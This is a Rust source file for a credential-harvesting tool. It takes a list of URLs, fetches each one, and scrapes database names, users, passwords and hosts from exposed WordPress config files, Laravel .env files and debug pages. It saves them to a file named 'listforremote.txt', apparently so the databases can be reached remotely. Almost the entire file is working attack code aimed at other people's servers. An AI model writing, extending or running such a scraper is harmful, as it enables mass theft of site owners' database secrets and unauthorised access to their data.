use std::{fs::File, io::{self, BufRead, BufReader}, path::Path};
use regex::Regex;
use rayon::prelude::*;
use reqwest::{Client, ClientBuilder};
use scraper::{Html, Selector, Element};
use tokio::fs;
use colored::*;
use std::sync::Mutex;
use std::error::Error;
use tokio::io::AsyncWriteExt;
use std::sync::Arc;

pub async fn run() -> Result<(), Box<dyn Error>> {
    println!("[+] submit file wat to be procces: ");
    let mut filename = String::new();
    io::stdin().read_line(&mut filename)?;
    filename = filename.trim().to_string();

    // Read URLs from file
    let file = File::open(&filename)?;
    let reader = BufReader::new(file);
    let urls: Vec<String> = reader.lines()
        .filter_map(Result::ok)
        .collect();

    // Create output directory if it doesn't exist
    if !Path::new("output").exists() {
        fs::create_dir("output").await?;
    }
    
    // Create or truncate the output file
    tokio::fs::File::create("output/listforremote.txt").await?;
    let output_file = Arc::new(Mutex::new(
        tokio::fs::OpenOptions::new()
            .write(true)
            .append(true)
            .open("output/listforremote.txt")
            .await?
    ));

    // Setup HTTP client with rustls-tls
    let client = ClientBuilder::new()
        .use_rustls_tls()
        .build()?;
    let client = Arc::new(client);

    // Process URLs in parallel using rayon
    urls.par_iter()
        .map(|url| {
            let client = Arc::clone(&client);
            let output_file = Arc::clone(&output_file);
            
            tokio::runtime::Handle::current().block_on(async {
                match extract_info(url, &client, &output_file).await {
                    Ok(()) => println!("{} {}", "Found".green(), url),
                    Err(_) => println!("{} {}", "Error".red(), url),
                }
            })
        })
        .collect::<Vec<_>>();

    println!("{}", "\nDONE! output/listforremote.txt.".green());

    Ok(())
}

async fn extract_info(
    url: &str, 
    client: &Client, 
    output_file: &Arc<Mutex<tokio::fs::File>>
) -> Result<(), Box<dyn Error>> {
    // Fetch the URL content
    let response = client.get(url.trim()).send().await?;
    let content = response.text().await?;

    // Define regex patterns
    let dbname_pattern1 = Regex::new(r"define\('DB_NAME',\s*'([^']+)'\);")?;
    let dbname_pattern2 = Regex::new(r"DB_DATABASE=(.*)\n")?;
    
    let dbuser_pattern1 = Regex::new(r"define\('DB_USER',\s*'([^']+)'\);")?;
    let dbuser_pattern2 = Regex::new(r"DB_USERNAME=(.*)\n")?;
    
    let dbpass_pattern1 = Regex::new(r"define\('DB_PASSWORD',\s*'([^']+)'\);")?;
    let dbpass_pattern2 = Regex::new(r"DB_PASSWORD=(.*)")?;
    
    let host_pattern1 = Regex::new(r"define\('DB_HOST',\s*'([^']+)'\);")?;
    let host_pattern2 = Regex::new(r"DB_HOST=(.*)\n")?;

    // Try to find database credentials using regex
    let dbname = dbname_pattern1.captures(&content)
        .or_else(|| dbname_pattern2.captures(&content))
        .map(|cap| cap[1].to_string());
    
    let dbuser = dbuser_pattern1.captures(&content)
        .or_else(|| dbuser_pattern2.captures(&content))
        .map(|cap| cap[1].to_string());
    
    let dbpass = dbpass_pattern1.captures(&content)
        .or_else(|| dbpass_pattern2.captures(&content))
        .map(|cap| cap[1].to_string());
    
    let host = host_pattern1.captures(&content)
        .or_else(|| host_pattern2.captures(&content))
        .map(|cap| cap[1].to_string());

    // If regex doesn't find all credentials, try HTML parsing
    if dbname.is_none() || dbuser.is_none() || dbpass.is_none() || host.is_none() {
        let document = Html::parse_document(&content);
        
        // Try to find database credentials in HTML and use them if found
        let dbname = dbname.or_else(|| find_html_value(&document, "DB_DATABASE"));
        let dbuser = dbuser.or_else(|| find_html_value(&document, "DB_USERNAME"));
        let dbpass = dbpass.or_else(|| find_html_value(&document, "DB_PASSWORD"));
        let dbhost = host.or_else(|| find_html_value(&document, "DB_HOST"));
        
        // If we found all credentials from HTML, write them to file
        if let (Some(dbname), Some(dbuser), Some(dbpass), Some(host)) = (&dbname, &dbuser, &dbpass, &dbhost) {
            let line = format!("{}|{}|{}|{}|{}\n", 
                url.trim(),
                dbname.replace("\"\n\n", "").replace("\"\n", ""), 
                dbuser.replace("\"\n\n", "").replace("\"\n", ""), 
                dbpass.replace("\"\n\n", "").replace("\"\n", ""), 
                host.replace("\"\n\n", "").replace("\"\n", "")
            );
            
            let mut file = output_file.lock().unwrap();
            return file.write_all(line.as_bytes()).await.map_err(|e| e.into());
        }
        
        return Ok(());
    }

    // All credentials found via regex, write to file
    if let (Some(dbname), Some(dbuser), Some(dbpass), Some(host)) = (dbname, dbuser, dbpass, host) {
        let line = format!("{}|{}|{}|{}|{}\n", 
            url.trim(),
            dbname.replace("\"\n\n", "").replace("\"\n", ""), 
            dbuser.replace("\"\n\n", "").replace("\"\n", ""), 
            dbpass.replace("\"\n\n", "").replace("\"\n", ""), 
            host.replace("\"\n\n", "").replace("\"\n", "")
        );
        
        let mut file = output_file.lock().unwrap();
        file.write_all(line.as_bytes()).await?;
    }

    Ok(())
}

fn find_html_value(document: &Html, field_name: &str) -> Option<String> {
    let td_selector = Selector::parse("td").ok()?;
    
    for element in document.select(&td_selector) {
        if element.text().collect::<String>() == field_name {
            // Use next_sibling_element() which is from the Element trait we imported
            if let Some(next_sibling) = element.next_sibling_element() {
                return Some(next_sibling.text().collect::<String>().trim_matches('"').to_string());
            }
        }
    }
    
    None
}
